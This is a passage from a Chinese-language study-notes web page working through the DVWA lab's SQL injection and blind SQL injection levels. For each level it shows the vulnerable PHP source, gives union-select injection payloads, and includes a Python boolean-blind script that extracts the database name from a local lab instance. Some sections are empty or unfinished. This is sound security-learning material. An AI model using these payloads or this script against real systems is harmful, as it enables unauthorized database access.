<span class="string">"last_name"</span> );</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">        <span class="comment">// Increase loop count</span></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>sql语句为如下：id参数为字符类型，可控</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> user_id = <span class="string">'$id'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select 1,2--</span><br></pre></td></tr></table></figure>
+
+<h4 id="SQL-Injection：Medium"><a href="#SQL-Injection：Medium" class="headerlink" title="SQL Injection：Medium"></a>SQL Injection：Medium</h4><p><img src="image-20200613193941882.png" alt="image-20200613193941882"></p>
+<p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ];</span><br><span class="line">    $id = mysql_real_escape_string( $id );</span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = mysql_numrows( $result );</span><br><span class="line">    $i   = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> );</span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> );</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">        <span class="comment">// Increase loop count</span></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>sql语句为如下：id参数为数字类型，可控</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> user_id = $<span class="keyword">id</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1111 union select 1,2%23</span><br></pre></td></tr></table></figure>
+
+<h4 id="SQL-Injection：High"><a href="#SQL-Injection：High" class="headerlink" title="SQL Injection：High"></a>SQL Injection：High</h4><p><img src="image-20200613200123451.png" alt="image-20200613200123451"></p>
+<p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">'id'</span> ];</span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );</span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = mysql_numrows( $result );</span><br><span class="line">    $i   = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> );</span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> );</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">        <span class="comment">// Increase loop count</span></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>带入的SQL语句如下，id参数为字符类型,与上次不同的地方在于最后多了一个查询数量的限制：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> user_id = <span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,(select database())--+</span><br></pre></td></tr></table></figure>
+
+<p>如果要查询多条数据可使用concat函数进行合并，或者进行多次查询</p>
+<h4 id="SQL-Injection：Impossible"><a href="#SQL-Injection：Impossible" class="headerlink" title="SQL Injection：Impossible"></a>SQL Injection：Impossible</h4><p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">'first_name'</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">'last_name'</span> ];</span><br><span class="line">           <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>GET获取参数id，判断id是否时数字，如果是，PDO预编译再查询，没办法弄</p>
+<h4 id="SQL-Injection-Blind：Low"><a href="#SQL-Injection-Blind：Low" class="headerlink" title="SQL Injection Blind：Low"></a>SQL Injection Blind：Low</h4><p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysql_query( $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysql_numrows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>GET获取参数id，带入SQL查询，查询成功与不成功回显不一样，可选择布尔盲注</p>
+<p>SQL语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> user_id = <span class="string">'$id'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>盲注Python脚本：获取数据库名称</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">header</span><span class="params">(cookie: str)</span>:</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'cookie'</span>: <span class="string">f'<span class="subst">&#123;cookie&#125;</span>'</span>,</span><br><span class="line">        <span class="string">'Host'</span>: <span class="string">'localhost'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">        <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dblength</span><span class="params">(url, headers)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">f"1'+and+length(database())=<span class="subst">&#123;i&#125;</span>--+&amp;Submit=Submit#"</span></span><br><span class="line">        response = requests.get(url+payload, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'exists'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = <span class="string">'http://localhost/vulnerabilities/sqli_blind/?id='</span></span><br><span class="line">    cookie = <span class="string">'PHPSESSID=fnt82ncr1rka6440pcij663fb1; security=low'</span></span><br><span class="line">    headers = header(cookie)</span><br><span class="line">    db_length = dblength(url, headers)</span><br><span class="line">    db_name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">0</span>, db_length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">f"1'+and+ascii(substr((select+database()),<span class="subst">&#123;_&#125;</span>,1))=<span class="subst">&#123;i&#125;</span>--+&amp;Submit=Submit#"</span></span><br><span class="line">            response = requests.get(url+payload, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'exist'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                db_name += chr(i)</span><br><span class="line">    print(<span class="string">f'database name：<span class="subst">&#123;db_name&#125;</span>'</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="SQL-Injection-Blind：Medium"><a href="#SQL-Injection-Blind：Medium" class="headerlink" title="SQL Injection Blind：Medium"></a>SQL Injection Blind：Medium</h4><p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ];</span><br><span class="line">    $id = mysql_real_escape_string( $id );</span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br><span class="line">    $result = mysql_query( $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysql_numrows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参数通过post提交，通过mysql_real_escape_string()函数过滤，代入sql语句中，数字型，查询成功和失败有不同的回显</p>
+<blockquote>
+<p><img src="image-20200614165226665.png" alt="image-20200614165226665"></p>
+</blockquote>
+<p>单双引号被过滤了</p>
+<p>SQL查询语句为数字型如下，不需要引号即可注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> user_id = $<span class="keyword">id</span>;</span><br></pre></td></tr></table></figure>
+
+<p>payload形如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+and+length((<span class="keyword">select</span>+<span class="keyword">database</span>()))&gt;<span class="number">0</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>python盲注脚本：获取数据库名称：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="SQL-Injection-Blind：High"><a href="#SQL-Injection-Blind：High" class="headerlink" title="SQL Injection Blind：High"></a>SQL Injection Blind：High</h4><h4 id="SQL-Injection-Blind：Impossible"><a href="#SQL-Injection-Blind：Impossible" class="headerlink" title="SQL Injection Blind：Impossible"></a>SQL Injection Blind：Impossible</h4><p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">            header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+    
+        <a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/XSS%E5%9F%BA%E7%A1%80/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">XSS基础学习</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            kn0sky &copy; 2020 
+            <a rel="external nofollow noopener noreferrer" href="http://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png"></a>
+            <br> Powered by <a href="http://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. Theme - <a href="https://github.com/zthxxx/hexo-theme-Wikitten" target="_blank" rel="external nofollow noopener noreferrer">wikitten</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
